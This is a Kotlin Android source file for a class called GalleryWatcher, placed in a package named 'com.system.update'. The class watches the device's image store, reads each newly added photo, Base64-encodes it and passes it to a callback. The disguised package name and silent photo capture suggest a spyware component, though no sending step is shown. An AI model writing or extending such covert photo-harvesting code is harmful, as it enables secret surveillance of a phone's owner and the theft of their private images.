package com.system.update

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Base64
import android.util.Log

class GalleryWatcher(
    private val ctx: Context,
    private val onNewImage: (Map<String, String>) -> Unit
) {

    companion object {
        private const val TAG = "GalleryWatcher"
    }

    private var observer: ContentObserver? = null

    fun start() {
        if (observer != null) return

        observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                if (uri == null) return
                try {
                    val cursor = ctx.contentResolver.query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        arrayOf(MediaStore.Images.Media._ID),
                        null, null, "date_added DESC LIMIT 1"
                    )
                    cursor?.use {
                        if (it.moveToFirst()) {
                            val id = it.getLong(0)
                            val imgUri = Uri.withAppendedPath(
                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                            )
                            val b64 = try {
                                val bytes = ctx.contentResolver.openInputStream(imgUri)?.readBytes() ?: ByteArray(0)
                                if (bytes.size < 500_000)
                                    Base64.encodeToString(bytes, Base64.NO_WRAP)
                                else ""
                            } catch (_: Exception) { "" }
                            if (b64.isNotEmpty()) {
                                onNewImage(mapOf("data" to b64))
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "read error", e)
                }
            }
        }

        try {
            ctx.contentResolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                observer!!
            )
            Log.i(TAG, "Gallery watcher started")
        } catch (e: Exception) {
            Log.e(TAG, "register error", e)
        }
    }

    fun stop() {
        try {
            observer?.let { ctx.contentResolver.unregisterContentObserver(it) }
        } catch (_: Exception) {}
        observer = null
    }
}
